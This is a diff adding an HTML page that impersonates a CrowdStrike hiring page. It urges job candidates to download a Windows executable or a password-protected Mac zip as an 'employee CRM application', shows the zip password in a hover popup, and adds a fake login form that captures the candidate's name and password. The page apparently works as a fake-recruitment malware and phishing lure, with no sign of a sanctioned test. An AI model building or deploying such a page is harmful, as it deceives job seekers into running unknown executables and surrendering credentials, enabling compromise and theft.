@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CrowdStrike - The Next Step</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Split background */
+        .background {
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            display: flex;
+        }
+
+        .background-left {
+            width: 50%;
+            height: 100%;
+            background-color: #E31D1A;
+        }
+
+        .background-right {
+            width: 50%;
+            height: 100%;
+            background-color: #000000;
+        }
+
+        /* Header text */
+        .header-text {
+            position: absolute;
+            top: 60px;
+            right: 100px;
+            color: white;
+            font-size: 64px;
+            font-weight: bold;
+        }
+
+        /* Content card */
+        .card {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 900px;
+        }
+
+        .logo {
+            width: 400px;
+            margin-bottom: 24px;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        /* Download buttons */
+        .download-buttons {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+
+        .download-btn {
+            background-color: #1D1D1D;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .download-btn:hover {
+            opacity: 0.9;
+        }
+
+        .download-btn img {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Installation instructions */
+        .instructions {
+            margin-bottom: 32px;
+        }
+
+        .instructions p {
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .instructions ul {
+            list-style-position: inside;
+            padding-left: 20px;
+        }
+
+        .instructions li {
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+
+        /* Footer */
+        .footer {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        /* Popup styles */
+        .popup {
+            position: fixed;
+            background-color: #333;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s, visibility 0.2s;
+            max-width: 300px;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            pointer-events: none;
+        }
+
+        .popup.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Arrow for popup */
+        .popup::before {
+            content: '';
+            position: absolute;
+            left: -10px;
+            top: 50%;
+            transform: translateY(-50%);
+            border-width: 10px;
+            border-style: solid;
+            border-color: transparent #333 transparent transparent;
+        }
+        /* Login Modal styles */
+        .login-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            z-index: 1001;
+            display: none;
+            width: 300px;
+        }
+
+        .login-modal.show {
+            display: block;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            display: none;
+        }
+
+        .modal-overlay.show {
+            display: block;
+        }
+
+        .login-modal h3 {
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            padding: 8px 16px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .modal-buttons .cancel-btn {
+            background: #f0f0f0;
+        }
+
+        .modal-buttons .login-btn {
+            background: #E31D1A;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="background">
+        <div class="background-left"></div>
+        <div class="background-right"></div>
+    </div>
+
+    <h1 class="header-text">The next step.</h1>
+
+    <div class="card">
+        <img src="CrowdStrike_logo.png" alt="CrowdStrike Logo" class="logo">
+        
+        <h2>Our team is excited at the prospect of you joining us!</h2>
+        
+        <p>Please download our employee CRM application on Windows or Mac to schedule your call with the hiring team!</p>
+        
+        <div class="download-buttons">
+            
+            <a href="crowdstrike.exe" download class="download-btn">
+                <img src="windows-10.png" alt="Windows icon">
+                Download for Windows
+            </a>
+            
+            <a href="crowdstrike.zip" download class="download-btn">
+                <img src="apple.png" alt="Apple icon">
+                Download for MacOS
+            </a>
+            
+        </div>
+        
+        <div class="instructions">
+            <p>Upon completing installation:</p>
+            <ul>
+                <li><a href="#" id="loginLink" style="color: inherit; text-decoration: underline;">Login</a> to your profile with your full name</li>
+                <li>Create a strong password</li>
+                <li>Find the role you are a candidate for by navigating to "Applications"</li>
+                <li>Click "Schedule Interview" and select a timeslot from the available openings.</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Privacy</a> | <a href="#">Contact</a>
+        </div>
+    </div>
+
+    <!-- Add popup element -->
+    <div id="macPopup" class="popup">
+        Use password: Work@CWS to unlock the Zip file and install the program
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="modalOverlay"></div>
+    <div class="login-modal" id="loginModal">
+        <h3>Login to Your Profile</h3>
+        <div class="input-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter your full name">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password">
+        </div>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelLogin">Cancel</button>
+            <button class="login-btn" id="submitLogin">Login</button>
+        </div>
+    </div>
+
+    <script>
+        const macButton = document.querySelector('.download-btn:last-child');
+        const popup = document.getElementById('macPopup');
+        
+        macButton.addEventListener('mouseenter', (e) => {
+            // Position popup next to the button
+            const buttonRect = macButton.getBoundingClientRect();
+            popup.style.top = buttonRect.top + 'px';
+            popup.style.left = (buttonRect.right + 20) + 'px';
+            
+            // Show popup
+            popup.classList.add('show');
+        });
+
+        macButton.addEventListener('mouseleave', () => {
+            popup.classList.remove('show');
+        });
+
+        const loginLink = document.getElementById('loginLink');
+        const loginModal = document.getElementById('loginModal');
+        const modalOverlay = document.getElementById('modalOverlay');
+        const cancelLogin = document.getElementById('cancelLogin');
+        const submitLogin = document.getElementById('submitLogin');
+
+        function showModal() {
+            loginModal.classList.add('show');
+            modalOverlay.classList.add('show');
+        }
+
+        function hideModal() {
+            loginModal.classList.remove('show');
+            modalOverlay.classList.remove('show');
+            // Clear input fields
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        loginLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showModal();
+        });
+
+        modalOverlay.addEventListener('click', hideModal);
+        cancelLogin.addEventListener('click', hideModal);
+
+        submitLogin.addEventListener('click', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            console.log('Login attempt:', { username, password });
+            // Add your login logic here
+            hideModal();
+        });
+    </script>
+</body>
+</html>
